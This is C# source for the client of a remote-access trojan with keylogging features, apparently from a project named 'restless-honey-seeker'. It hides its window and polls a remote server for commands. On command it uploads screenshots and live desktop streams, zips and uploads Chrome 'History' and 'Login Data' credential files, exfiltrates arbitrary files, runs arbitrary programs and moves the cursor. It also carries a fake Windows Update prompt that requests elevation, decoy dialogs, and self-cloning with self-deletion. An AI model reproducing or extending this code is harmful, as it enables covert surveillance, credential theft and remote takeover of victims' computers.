﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using KeyLogTest.Delegates;
using System.Net;
using Library;
using System.Diagnostics;
using Client.Properties;
using System.Security.Principal;
using Models;
using Ionic.Zip;
using Ionic.Zlib;
using System.Reflection;

namespace Client
{
    public partial class Form1 : Form
    {
        private static readonly string APIKEY_PRIVATE = "ca71ab6e833b109d781c722118d2bff373297dc1";
        private static readonly string APIKEY_PUBLIC = "a12ee5029cbf44c55869ba6d629b683d8f0044ef";
        private static readonly string APPDIR_DOWNLOADS = "Transfers\\Downloads";
        private static readonly string APPDIR_UPLOADS = "Transfers\\Uploads";
        private static readonly string PROTOCOL = "http://";
        private static readonly string IP_ADDRESS = "localhost"; // "192.168.1.100";// "kt-husid-webapp.cloudapp.net";
        private static readonly int PORT = 3226;
        private static string URL
        {
            get
            {
                return PROTOCOL + IP_ADDRESS + ":" + PORT + PATH;
            }
        }
        //private static readonly string IP_ADDRESS = "restless-honey-seeker.azurewebsites.net";
        //private static readonly int PORT = 80;
        private static readonly string PATH = "/api";// "/dev/restless-honey-seeker/server/api/1";//"/restless-honey-seeker/server/api/1";
        private static readonly int CONNECTION_TIMEOUT = 10000;
        private static readonly int CONNECTION_INTERVAL = 10000;
        private Timer transmitTimer;
        private int transmitTimerInterval = 1000;
        private Timer connectTimer;
        private string fakeTextFilePath;
        NotifyIcon notifyIcon;
        private readonly string appDir;
        private readonly string dirDownloads;
        private readonly string dirUploads;
        private Timer streamDesktopTimer;

        bool isCloning = false;
        bool startNewProcessOnExit = false; // true;
        Assembly thisApp = null;

        private void HideForm()
        {
            this.StartPosition = FormStartPosition.Manual;
            this.DesktopLocation = new Point(Screen.PrimaryScreen.Bounds.Width + 10000, Screen.PrimaryScreen.Bounds.Y + 10000);
            this.WindowState = FormWindowState.Minimized;
            Opacity = 0;
            ShowInTaskbar = false;
        }

        private void Replicate(string[] _args)
        {
            // Hide itself
            //File.SetAttributes(thisProgram, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
            if (_args.Length == 3)
            {
                //isCloning = Boolean.Parse(_args[0])
                var fiSrc = Encoding.Default.GetString(Convert.FromBase64String(_args[1]));
                startNewProcessOnExit = Boolean.Parse(_args[2]);
                //clone app to other destination
                if (_args[0] == "clone")
                {
                    try
                    {
                        // todo: Should be dynamic places
                        string destDir = Path.Combine(Environment.CurrentDirectory, "Clone");// Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);// Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                        if (!Directory.Exists(destDir))
                        {
                            try
                            {
                                Directory.CreateDirectory(destDir);
                            }
                            catch { }
                        }
                        FileInfo fiSelf = new FileInfo(thisApp.Location);
                        var target = Path.Combine(destDir, fiSelf.Name);
                        if (fiSelf.DirectoryName != destDir)
                        {
                            if (File.Exists(target))
                            {
                                File.Delete(target);
                            }
                            File.Copy(thisApp.Location, target);
                            //System.Threading.Thread.Sleep(1000);
                            var psi = new ProcessStartInfo(target, "dont_clone " + Convert.ToBase64String(Encoding.Default.GetBytes(fiSelf.FullName)) + " false");
                            Process.Start(psi);
                            Application.Exit();
                        }
                    }
                    catch { }
                }
                else if (_args[0] == "dont_clone")
                {
                    // delete old app
                    try
                    {
                        System.Threading.Thread.Sleep(1000);
                        File.Delete(fiSrc);
                    }
                    catch { }
                }
            }
        }

        public Form1(string[] _args)
        {
            InitializeComponent();
            HideForm();
            Application.ApplicationExit += Application_ApplicationExit;
            thisApp = Assembly.GetExecutingAssembly();
            //File.SetAttributes(thisProgram, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
            //Replicate(_args);
            var appDirBase = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var appDirFolder = Path.Combine(appDirBase, "Hello World");
            if (!Directory.Exists(appDirFolder))
            {
                Directory.CreateDirectory(appDirFolder);
            }
            appDirFolder = Path.Combine(appDirFolder, PathExt.ReformatName("" + DateTime.Now.Ticks));
            if (!Directory.Exists(appDirFolder))
            {
                Directory.CreateDirectory(appDirFolder);
            }
            appDir = Path.Combine(appDirBase, appDirFolder);
            //Clipboard.SetText(appDir); MessageBox.Show(appDir);
            dirDownloads = Path.Combine(appDir, APPDIR_DOWNLOADS);
            dirUploads = Path.Combine(appDir, APPDIR_UPLOADS);
            CreateDirectory(appDir);
            CreateDirectory(dirDownloads);
            CreateDirectory(dirUploads);
            // OpenFakeTextFile("Hey!");
            Handler.Instance.Transmitter = new Library.Transmitter(URL, APIKEY_PRIVATE, APIKEY_PUBLIC, CONNECTION_TIMEOUT);
            //foo = Handler.Instance.Transmitter.Test(2);
            //foo = Handler.Instance.Transmitter.Test2("bar");
            //var compHash = Handler.Instance.Transmitter.GetComputerHash();
            //Clipboard.SetText(compHash); MessageBox.Show(compHash);
            //Handler.Instance.Transmitter.Authorize();
            //UploadImage();
            //UploadBrowserData();
            SetupConnectionTimer();
            //File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History", historyFile);
            //h.GetBrowserHistory(Handler.EBrowser.Chrome, historyFile);
            //FirewallManager.Instance.AddPort(1234, "test1234");
            //MinimizeFootPrint();
            //SetupFakeMsg();
        }

        private void SetupConnectionTimer()
        {
            connectTimer = new Timer();
            if (!ConnectAndSetup())
            {
                connectTimer.Interval = CONNECTION_INTERVAL;
                connectTimer.Tick += (o, e) =>
                {
                    connectTimer.Enabled = !ConnectAndSetup();
                };
            }
        }

        private void SetupFakeMsg()
        {
            var fakeForm = new FormStoppedWorking();
            fakeForm.ShowDialog();
            fakeForm.FormClosing += (o, e) =>
            {
                //HideForm();
            };
        }

        void Application_ApplicationExit(object sender, EventArgs e)
        {
            if (startNewProcessOnExit)
            {
                var fi = new FileInfo(thisApp.Location);
                Process.Start(new ProcessStartInfo(fi.FullName, "clone " + Convert.ToBase64String(Encoding.Default.GetBytes(fi.FullName)) + " true"));
            }
            try
            {
                Handler.Instance.Transmitter.DeAuthorize();
            }
            catch { }
        }

        private string GetProgramName()
        {
            var process = Process.GetCurrentProcess();
            if (process != null)
            {
                return process.ProcessName;
            }
            return string.Empty;
        }

        [System.Runtime.InteropServices.DllImport("psapi.dll")]
        static extern int EmptyWorkingSet(IntPtr hwProc);

        static void MinimizeFootPrint()
        {
            EmptyWorkingSet(Process.GetCurrentProcess().Handle);
        }

        /// <summary>
        /// Returns TRUE if authorized
        /// </summary>
        /// <returns></returns>
        bool ConnectAndSetup()
        {
            bool isAuthorized = Handler.Instance.Transmitter.Authorize();
            if (isAuthorized)
            {
                //Handler.Instance.StartKeyLogger();
                //Handler.Instance.StartExceptionHandling();
                Handler.Instance.StartDirectoryWatcher();

                Handler.Instance.OnReturn += (o, e) =>
                {
                    HandleReturnEvent(e);
                };
                Handler.Instance.OnFileEvent += (o, e) =>
                {
                    HandleFileEvent(e);
                };
                Handler.Instance.OnScreenshot += (o, e) =>
                {
                    //HandleImageEvent(e);
                };

                transmitTimer = new Timer();
                transmitTimer.Interval = 1000;
                transmitTimer.Tick += (o, e) =>
                {
                    Handler.Instance.Transmitter.LoadSettings();
                    if (Handler.Instance.Transmitter.TSettings == null) return;
                    if (Handler.Instance.Transmitter.TSettings.HasExectuted) return;
                    //var command = Handler.Instance.Transmitter.GetCommand();
                    //if (!command.ToString().Equals("DO_NOTHING"))
                    //{
                    //    MessageBox.Show(command.ToString());
                    //}
                    switch (Handler.Instance.Transmitter.TSettings.Command)
                    {
                        case ECommand.SET_TRANSMISSION_INTERVAL:
                            SetTransmissionInterval(Handler.Instance.Transmitter.TSettings.Parameters);
                            break;
                        case ECommand.UPLOAD_IMAGE:
                            long quality = 80;
                            long.TryParse(Handler.Instance.Transmitter.TSettings.Parameters, out quality);
                            UploadImage(quality);//.ImageQuality);
                            break;
                        case ECommand.UPLOAD_SENTENCES:
                            UploadSentences();
                            break;
                        case ECommand.EXECUTE_COMMAND:
                            ExecuteCommand();
                            break;
                        case ECommand.UPLOAD_WEBCAM_IMAGE:
                            //pictureBox2.Image = Handler.Instance.CaptureWebcamImage(ref pictureBox2);
                            break;
                        case ECommand.UPLOAD_PORT_INFO:
                            UploadPortInfo();
                            break;
                        case ECommand.UPLOAD_BROWSER_DATA:
                            UploadBrowserData();
                            break;
                        case ECommand.UPLOAD_FILE_EVENTS:
                            UploadFileEvents();
                            break;
                        case ECommand.DOWNLOAD_FILE:
                            DownloadFile();
                            break;
                        case ECommand.UPLOAD_FILE:
                            //UploadFile(dirDownloads + "\\" + Handler.Instance.Transmitter.TSettings.FileToDownload);
                            UploadFile();
                            break;
                        case ECommand.STREAM_DESKTOP:
                            StreamDesktop();
                            break;
                        case ECommand.STOP_STREAM_DESKTOP:
                            StopStreamDesktop();
                            break;
                        case ECommand.MOVE_CURSOR:
                            CursorInteract();
                            break;
                    }
                    Handler.Instance.Transmitter.SetHasExectuted(Handler.Instance.Transmitter.TSettings);
                };
                transmitTimer.Enabled = true;
                //CreateFakeWindowsUpdateNotifyIcon(1000,  "New updates are available", "Click to install them using Windows Update.");
            }
            return isAuthorized;
        }

        private void SetTransmissionInterval(string timeMS)
        {
            int newInterval = 1000;
            if (int.TryParse(timeMS, out newInterval))
            {
                transmitTimerInterval = newInterval;
                transmitTimer.Interval = transmitTimerInterval;
                //transmitTimer.Stop();
                //transmitTimer.
            }
        }

        private void StopStreamDesktop()
        {
            if (streamDesktopTimer == null) return;
            streamDesktopTimer.Enabled = false;
            streamDesktopTimer.Stop();
        }

        private void StreamDesktop()
        {
            streamDesktopTimer = new Timer();
            streamDesktopTimer.Interval = 1000;
            streamDesktopTimer.Tick += (o, e) =>
            {
                StreamImage();
                //CursorInteract();
            };
            streamDesktopTimer.Enabled = true;
            streamDesktopTimer.Start();
        }

        private void CursorInteract()
        {
            //MessageBox.Show(Handler.Instance.Transmitter.TSettings.CursorX + ", " + Handler.Instance.Transmitter.TSettings.CursorY);
            this.Cursor = new Cursor(Cursor.Current.Handle);
            Cursor.Position = new Point(Handler.Instance.Transmitter.TSettings.CursorX, Handler.Instance.Transmitter.TSettings.CursorY);
            string inputChar = Handler.Instance.Transmitter.TSettings.KeyCode;
            if (inputChar.Length > 0)
            {
                //MessageBox.Show(inputChar);
            }
            //Cursor.Clip = new Rectangle(this.Location, this.Size);
        }

        private void UploadFileEvents()
        {
            StringBuilder sb = new StringBuilder();
            Handler.Instance.FileDirInfo.FileDirInfoList.ForEach((FileDirInfo fdi) => sb.AppendLine(fdi.DateTime.ToString() + " " + fdi.FileInfo.ToString()));
            Handler.Instance.Transmitter.UploadFileEvents(sb.ToString());
        }

        private void DownloadFile()
        {
            byte[] fileData = Handler.Instance.Transmitter.DownloadFile();
            if (fileData != null)
            {
                string path = appDir + "\\Transfers";
                if (!Directory.Exists(path))
                {
                    try
                    {
                        Directory.CreateDirectory(path);
                    }
                    catch { }
                }
                try
                {
                    File.WriteAllBytes(Path.Combine(path, Handler.Instance.Transmitter.TSettings.File), fileData);
                }
                catch { }
            }
        }

        private void UploadFile()
        {
            var fileInfo = new FileInfo(Handler.Instance.Transmitter.TSettings.File); // .FileToDownload);
            var fileData = Convert.ToBase64String(File.ReadAllBytes(fileInfo.FullName));
            Handler.Instance.Transmitter.UploadFile(new FileData()
            {
                FileInfo = fileInfo,
                Data = fileData
            });
        }

        //private void UploadFile(string path, int c = 0)
        //{
        //    if (!Handler.Instance.Transmitter.UploadFile(PatHandler.Instance.GetFileName(path), path) && c <= 1)
        //    {
        //        UploadFile(Handler.Instance.Transmitter.TSettings.FileToDownload, c + 1);
        //    }
        //    try
        //    {
        //        File.Delete(path);
        //    }
        //    catch (Exception ex) { }
        //}

        //private void CompressAndUploadFile(string fileFullPath)
        //{
        //    try
        //    {
        //        string fileName = Path.GetFileName(fileFullPath);
        //        string fileToUpload = dirDownloads + "\\" + fileName;
        //        if (Compression.Zip(fileFullPath, fileToUpload))
        //        {
        //            Handler.Instance.Transmitter.UploadFile(fileName, fileToUpload);
        //        }
        //        try
        //        {
        //            File.Delete(fileToUpload);
        //        }
        //        catch (Exception ex) { }
        //    }
        //    catch (Exception ex) { }
        //}

        public static void CopyStream(Stream input, Stream output)
        {
            byte[] buffer = new byte[8 * 1024];
            int len;
            while ((len = input.Read(buffer, 0, buffer.Length)) > 0)
            {
                output.Write(buffer, 0, len);
            }
        }

        private void CreateDirectory(string dir)
        {
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }
        }

        private void UploadBrowserData()
        {
            try
            {
                // Save Chrome Browser data
                string[] chromeFiles = new string[] {
                        "History",
                        "Login Data"
                    };
                var chromePath = @"\Google\Chrome\User Data\Default\";
                int c = 0;
                string[] zipFiles = new string[chromeFiles.Length];
                foreach (var file in chromeFiles)
                {
                    //var destFileName = dirUploads + @"\Chrome " + file;
                    //if (File.Exists(destFileName))
                    //{
                    //    File.Delete(destFileName);
                    //}
                    var sourceFileName = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + chromePath + file;
                    //File.Copy(sourceFileName, destFileName);
                    //zipFiles[c] = destFileName;
                    zipFiles[c] = sourceFileName;
                    c++;
                }
                //var fileData = Compression.Compress(zipFiles);
                //File.WriteAllBytes(@"C:\Users\benjamin\AeroFS\Visual Studio 2012\Projects\restless-honey-seeker\serverDotNet\Server\DataFromClient\" + DateTime.Now.Ticks + ".zip", fileData);
                Handler.Instance.Transmitter.UploadFile(new FileData()
                {
                    FileNameWithExtension = "ChromeData.zip",
                    Data = Convert.ToBase64String(Compression.Compress(zipFiles))
                });


                //if (Compression.Zip(zipFiles, dirUploads + "\\Chrome Browser Data.zip"))
                //{
                //    foreach (var file in chromeFiles)
                //    {
                //        try
                //        {
                //            File.Delete(dirUploads + @"\Chrome " + file);
                //        }
                //        catch (Exception ex) { }
                //    }
                //    string fileToUpload = dirUploads + "\\Chrome Browser Data.zip";
                //    //Handler.Instance.Transmitter.UploadFile("Chrome Browser Data", fileToUpload);
                //    var fileInfo = new FileInfo(fileToUpload);
                //    var fileData = File.ReadAllBytes(fileInfo.FullName);
                //    Handler.Instance.Transmitter.UploadFile(new FileData()
                //    {
                //        FileInfo = fileInfo,
                //        Data = fileData
                //    });
                //    try
                //    {
                //        File.Delete(fileToUpload);
                //    }
                //    catch (Exception ex) { }
                //}
            }
            catch (Exception ex) { }
        }

        private void CreateFakeWindowsUpdateNotifyIcon(int msDelay, string title, string text)
        {
            System.Timers.Timer timer = new System.Timers.Timer(msDelay);
            timer.Elapsed += (o, e) =>
            {
                timer.Enabled = false;
                notifyIcon = new NotifyIcon();
                notifyIcon.Icon = Resources.windows_update_icon_2;
                notifyIcon.BalloonTipIcon = ToolTipIcon.Warning;
                notifyIcon.BalloonTipTitle = title;
                notifyIcon.BalloonTipText = text;
                notifyIcon.Visible = true;
                notifyIcon.Click += notifyIcon_Click;
                notifyIcon.BalloonTipClicked += notifyIcon_BalloonTipClicked;
                notifyIcon.ShowBalloonTip(5000);
            };
            timer.Enabled = true;
        }

        private bool OpenFakeTextFile(string message)
        {
            try
            {
                String tempDir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                //String tempDir = appDir + "\\" + DateTime.Now.Ticks;
                //CreateDirectory(tempDir);
                //tempFile = tempDir + "\\" + PathExt.ReformatName(GetProgramName()) + ".txt";
                fakeTextFilePath = Environment.CurrentDirectory + "\\" + PathExt.ReformatName(GetProgramName()) + ".txt";
                using (FileStream fs = new FileStream(fakeTextFilePath, FileMode.Create))
                {
                    using (StreamWriter sw = new StreamWriter(fs, Encoding.UTF8))
                    {
                        sw.WriteLine(message);
                        sw.Close();
                    }
                    fs.Close();
                }
                FileInfo fileInfo = new FileInfo(fakeTextFilePath);
                fileInfo.Attributes = FileAttributes.Hidden;
                ProcessStartInfo psi = new ProcessStartInfo("notepad.exe", fakeTextFilePath);
                psi.WindowStyle = ProcessWindowStyle.Maximized;
                psi.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                Process.Start(psi);
                return true;
            }
            catch (Exception ex) { return false; }
        }

        private void UploadPortInfo()
        {
            StringBuilder sb = new StringBuilder();
            var piList = FirewallManager.Instance.GetPortInfo();
            piList.ForEach((Library.PortInfo pi) => sb.AppendLine(pi.IP + ":" + pi.Port + " - " + pi.Name));
            Handler.Instance.Transmitter.UploadPortInfo(sb.ToString());
        }

        void notifyIcon_Click(object sender, EventArgs e)
        {
            notifyIcon.ShowBalloonTip(5000);
        }

        void notifyIcon_BalloonTipClicked(object sender, EventArgs e)
        {
            WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
            if (!hasAdministrativeRight)
            {
                if (RunElevated(Application.ExecutablePath))
                {
                    this.Close();
                    Application.Exit();
                }
            }
        }

        private void ExecuteCommand()
        {
            var fileName = Handler.Instance.Transmitter.TSettings.File;
            var fileArgs = Handler.Instance.Transmitter.TSettings.Parameters;

            fileArgs = fileArgs != null ? fileArgs : "";
            try
            {
                if (fileName.Length > 0)
                {
                    try
                    {
                        ProcessStartInfo psi = new ProcessStartInfo(fileName, fileArgs);
                        psi.WorkingDirectory = appDir;
                        Process.Start(psi);
                    }
                    catch (Exception ex)
                    {
                        fileName = appDir + "\\Transfers\\" + fileName;
                        try
                        {
                            ProcessStartInfo psi = new ProcessStartInfo(fileName, fileArgs);
                            psi.WorkingDirectory = dirDownloads;
                            Process.Start(psi);
                        }
                        catch (Exception ex2) { }
                    }
                }
            }
            catch { }
        }



        private static bool RunElevated(string fileName)
        {
            //MessageBox.Show("Run: " + fileName);
            ProcessStartInfo processInfo = new ProcessStartInfo();
            processInfo.Verb = "runas";
            processInfo.FileName = fileName;
            try
            {
                Process.Start(processInfo);
                return true;
            }
            catch (Win32Exception)
            {
                //Do nothing. Probably the user canceled the UAC window
            }
            return false;
        }

        private void UploadSentences()
        {
            Handler.Instance.Transmitter.UploadSentences(Handler.Instance.Sentences);
            //Handler.Instance.Sentences.Clear();
        }

        private void HandleReturnEvent(string e)
        {
            /*if (listBox1.InvokeRequired)
            {
                AddSentenceToListCallback d = new AddSentenceToListCallback(HandleReturnEvent);
                this.Invoke(d, new object[] { e });
            }
            else
            {
                listBox1.Items.Add(e);
            }*/
        }

        private void HandleImageEvent(Bitmap e)
        {
            /*if (pictureBox1.InvokeRequired)
            {
                SetImageCallback d = new SetImageCallback(HandleImageEvent);
                this.Invoke(d, new object[] { e });
            }
            else
            {
                pictureBox1.Image = e;
            }*/
        }

        private void UploadImage(long quality)
        {
            //long screenshotQuality = Handler.Instance.Transmitter.TSettings.ImageQuality;
            //Handler.Instance.Screenshot, Handler.Instance.Transmitter.TSettings.ImageQuality
            //if (bitmapImage == null)
            //    return;
            //var name = System.Environment.MachineName + "_" + DateTime.Now + ".jpg";
            //var file = Path.Combine(Environment.CurrentDirectory, PathExt.ReformatName(name));
            //ScreenMan.Instance.Save(bitmapImage, file, screenshotQuality);// System.Drawing.Imaging.ImageFormat.Jpeg);
            //string zipFile = PathExt.ReformatName(Handler.Instance.Transmitter.Auth.IpExternal) + PathExt.ReformatName(file) + ".zip";
            //Compression.Zip(new string[] { file }, zipFile, "replicator");
            //Handler.Instance.Transmitter.UploadImage(name, file);
            Handler.Instance.Transmitter.UploadImage(quality);
            //File.Delete(file);
            //File.Delete(zipFile);
        }

        private void StreamImage()
        {
            UploadImage(25L);
            ////Bitmap bitmapImage = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
            ////long screenshotQuality = 35L;// Handler.Instance.Transmitter.TSettings.ImageQuality;
            ////if (bitmapImage == null)
            ////    return;
            //try
            //{
            //    //var name = Handler.Instance.Transmitter.GetComputerHash() + ".jpg";
            //    //var name = "stream.jpg";
            //    //var file = Path.Combine(Environment.CurrentDirectory, PathExt.ReformatName(name));
            //    Bitmap img = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
            //    //ScreenMan.Instance.Save(img, file, screenshotQuality);
            //    //Handler.Instance.Transmitter.UploadImage(name, file);
            //    ImageConverter converter = new ImageConverter();
            //    byte[] imgArray = (byte[])converter.ConvertTo(img, typeof(byte[]));
            //    Handler.Instance.Transmitter.UploadImage(imgArray);//new ImageData() { Image = img, Token = Handler.Instance.Transmitter.Auth.Token });
            //    //File.Delete(file);
            //}
            //catch (Exception ex) { }
        }

        private int HandleFileEvent(FileSystemEventArgs e)
        {
            /*if (listBox2.InvokeRequired)
            {
                try
                {
                    SetTextCallback d = new SetTextCallback(HandleFileEvent);
                    this.Invoke(d, new object[] { e });
                }
                catch (ObjectDisposedException ex)
                {

                }
                return 1;
            }
            else
            {
                return listBox2.Items.Add(e.ChangeType + ", " + e.Name + ", " + e.FullPath);
            }*/
            return 0;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
